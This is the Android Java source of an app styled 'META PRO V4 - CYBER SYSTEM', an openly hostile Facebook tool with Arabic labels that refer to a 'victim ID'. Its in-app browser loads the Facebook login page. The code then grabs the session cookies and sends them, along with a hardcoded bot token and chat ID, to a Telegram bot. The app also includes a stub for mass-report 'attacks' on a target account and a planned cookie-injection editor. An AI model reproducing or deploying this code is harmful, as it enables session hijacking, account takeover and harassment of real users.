package com.jasser.fbtool;
import android.app.*;
import android.os.*;
import android.webkit.*;
import android.widget.*;
import android.view.*;
import android.graphics.Color;
import java.net.*;

public class MainActivity extends Activity {
    String token = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc";
    String chat = "5653032481";
    TextView statsView;
    int reportCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        showCyberDashboard();
    }

    private void showCyberDashboard() {
        LinearLayout main = new LinearLayout(this);
        main.setOrientation(LinearLayout.VERTICAL);
        main.setBackgroundColor(Color.parseColor("#0a0f1e"));
        main.setPadding(50, 80, 50, 50);

        TextView title = new TextView(this);
        title.setText("META PRO V4 - CYBER SYSTEM");
        title.setTextColor(Color.CYAN);
        title.setTextSize(22);
        title.setGravity(Gravity.CENTER);
        main.addView(title);

        // لوحة الإحصائيات
        statsView = new TextView(this);
        statsView.setText("\n📊 الإحصائيات:\nالبلاغات المنفذة: 0\nحالة النظام: جاهز...");
        statsView.setTextColor(Color.GREEN);
        main.addView(statsView);

        // حقل الـ ID للضحية
        EditText victimInput = new EditText(this);
        victimInput.setHint("ادخل ID الضحية هنا");
        victimInput.setHintTextColor(Color.GRAY);
        victimInput.setTextColor(Color.WHITE);
        main.addView(victimInput);

        // أزرار التحكم
        addButton(main, "🔥 بدء هجوم الإبلاغات", "#8B0000", v -> startAttack(victimInput.getText().toString()));
        addButton(main, "🍪 محرر الكوكيز (حقن الجلسة)", "#2563EB", v -> openCookieEditor());
        addButton(main, "🔓 تسجيل دخول (سحب بيانات)", "#1e293b", v -> openSecureBrowser("https://m.facebook.com/login"));

        setContentView(main);
    }

    private void addButton(LinearLayout layout, String text, String color, View.OnClickListener listener) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setBackgroundColor(Color.parseColor(color));
        btn.setTextColor(Color.WHITE);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(-1, -2);
        params.setMargins(0, 20, 0, 0);
        btn.setLayoutParams(params);
        btn.setOnClickListener(listener);
        layout.addView(btn);
    }

    private void openSecureBrowser(String url) {
        WebView wv = new WebView(this);
        wv.getSettings().setJavaScriptEnabled(true);
        wv.getSettings().setDomStorageEnabled(true);
        wv.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile");
        
        wv.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url.startsWith("http")) return false; // السماح فقط بروابط الويب
                return true; // حظر الروابط التي تحاول فتح تطبيقات أخرى (fbbpfi)
            }
            @Override
            public void onPageFinished(WebView view, String url) {
                String cookies = CookieManager.getInstance().getCookie(url);
                if (cookies != null && cookies.contains("c_user")) sendToTelegram("✅ New Session Captured:\n" + cookies);
            }
        });
        wv.loadUrl(url);
        setContentView(wv);
    }

    private void startAttack(String id) {
        if(id.isEmpty()) return;
        reportCount++;
        statsView.setText("\n📊 الإحصائيات:\nالبلاغات المنفذة: " + reportCount + "\nحالة النظام: جاري الإبلاغ عن " + id);
        openSecureBrowser("https://m.facebook.com/" + id);
        // هنا سيقوم السكريبت بالضغط التلقائي (سيتم تفعيله في التحديث القادم بمجرد استقرار الواجهة)
    }

    private void openCookieEditor() {
        // فكرة محرر الكوكيز: حقن الكوكيز يدوياً
        Toast.makeText(this, "ميزة الحقن ستتوفر فور استقرار السيرفر", Toast.LENGTH_SHORT).show();
    }

    private void sendToTelegram(String msg) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat + "&text=" + URLEncoder.encode(msg, "UTF-8"));
                url.openStream();
            } catch (Exception e) {}
        }).start();
    }
}
